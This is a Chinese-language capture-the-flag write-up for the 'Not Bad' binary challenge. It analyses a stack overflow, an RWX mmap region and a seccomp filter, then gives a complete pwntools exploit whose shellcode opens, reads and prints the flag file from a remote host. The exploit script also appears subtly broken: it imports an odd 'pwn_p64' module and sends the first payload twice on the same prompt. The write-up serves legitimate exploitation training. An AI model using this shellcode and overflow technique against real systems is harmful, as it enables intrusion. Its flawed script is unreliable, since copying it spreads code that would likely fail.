#### Not Bad

1. checksec

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# checksec bad 
   [*] '/home/kali/Desktop/bad'
       Arch:     amd64-64-little
       RELRO:    Partial RELRO
       Stack:    No canary found
       NX:       NX disabled
       PIE:      No PIE (0x400000)
       RWX:      Has RWX segments
   ```

   最后一行参数表示二进制文件具有可读、可写和可执行（RWX）的内存段，易被利用，而且所有保护都未开启，栈是可执行的
2. IDA静态分析

   ```c
   __int64 __fastcall main(int a1, char **a2, char **a3)
   {
     mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);
     sub_400949();
     sub_400906();
     sub_400A16();
     return 0LL;
   }
   ```

   第一行的内存映射简单理解为创建可写和可执行的内存空间，在看接下来的三个函数调用

   第一个函数调用明显使用Seccomp添加过滤规则

   ```c
   __int64 sub_400949()
   {
     seccomp_init();
     seccomp_rule_add();
     seccomp_rule_add();
     seccomp_rule_add();
     seccomp_rule_add();
     return seccomp_load();
   }
   ```

   第二个函数的作用是禁用标准输入、标准输出和标准错误流的缓冲区，即收到数据立即发送（对实时输出非常有利，但会降低效率，比如收到一字节就要做一次IO，效率降低）

   ```
   void sub_400906()
   {
     setbuf(stdin, 0LL);
     setbuf(stdout, 0LL);
     setbuf(stderr, 0LL);
   }
   ```

   第三个函数调用就是具体功能实现

   ```c
   int sub_400A16()
   {
     char buf[32]; // [rsp+0h] [rbp-20h] BYREF

     puts("Easy shellcode, have fun!");
     read(0, buf, 0x38uLL);
     return puts("Baddd! Focu5 me! Baddd! Baddd!");
   }
   ```

   但只能溢出0x38字节，多溢出24字节，可实现栈溢出。

   栈不可执行未开启，可以将shellcode写入buf，直接在栈上执行shellcode，但只有32字节明显不够，题目中mmap开辟了可写可执行的内存空间，所以可以这样构造栈（除mmap申请的空间以外，也可以找任意一块RWX空间写入正真的shellcode）

   `payload = 调用read(0,0x123000,0x1000) + jmp_0x123000 + b"a"*(剩余的字节数用来填满栈，包括抵消leave指令) + jmp_rsp`
   由于不知道栈的位置，所以只能劫持rip到jmp rsp的地址处

   利用Seccomp-tools工具查看该程序

   ```
   ┌──(root㉿kali)-[/home/kali/Desktop]
   └─# seccomp-tools dump ./bad
    line  CODE  JT   JF      K
   =================================
    0000: 0x20 0x00 0x00 0x00000004  A = arch
    0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
    0002: 0x20 0x00 0x00 0x00000000  A = sys_number
    0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
    0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
    0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
    0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
    0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
    0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010
    0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
    0010: 0x06 0x00 0x00 0x00000000  return KILL
   ```

   只能调用read，write，open三个系统调用，无法调用system函数。

   故mmap分配处的shellcode实现的功能读取flag文件
3. 利用脚本
   可以手写汇编，但也可以借助shellcraft模块直接实现

   ```
   # 导入所需的库
   from pwn import *
   from pwn_p64 import *

   # 远程对象
   io = remote("node4.buuoj.cn", 29087)

   # shellcode内存地址，jmp_rsp指令内存地址
   mmap = 0x123000
   jmp_rsp = 0x400a01

   # 前三条指令是read的三个参数 0是read的系统调用号
   # 结束read函数调用后（在mmap处写好shellcode后），跳转0x123000执行汇编指令
   read_on_mem = """
   mov rdi,0; 
   mov rsi,0x123000;
   mov rdx,0x1000;
   mov rax,0;  
   syscall;
   mov rax,0x123000;
   jmp rax;
   """

   # 栈上shellcode的编写
   payload = asm(read_on_mem).ljust(0x28, b"\0")  # 一部分shellcode，用0填充栈空间大小填满
   payload += p64(jmp_rsp)  # 劫持rip到jmp_rsp指令位置
   payload += asm("sub rsp,0x30;jmp rsp;")

   io.sendlineafter(b"have fun!", payload)

   # mmap映射内存处shellcode编写，先用open返回一个文件指针fd，再利用read将文件内容读取到rsp（栈顶处），再利用write输出

   # 先将要打开的文件"./flag"（0x67616c662f2e）写道栈顶，再将内存地址赋值给参数寄存器，调用后，rax寄存器存的就是文件指针
   open_flag = """
   xor rsi ,rsi ;
   xor rdx,rdx;
   mov rax,0x67616c662f2e;
   push rax;
   mov rdi,rsp;
   mov rax,2; 
   syscall;
   """

   # 调用read函数，栈顶被写入flag
   read_flag = """
   mov rdi,rax;
   mov rsi,rsp ;
   mov rdx,0x30;
   mov rax,0;
   syscall;
   """

   # 调用write输出flag
   output_flag = """
   mov rdi,1 ;
   mov rsi,rsp;
   mov rdx,0x30;
   mov rax,1;
   syscall;
   """

   shellcode = asm(open_flag + read_flag + output_flag)

   io.sendlineafter(b"have fun!", payload)
   io.sendlineafter(b"Baddd!", shellcode)
   io.interactive()
   ```
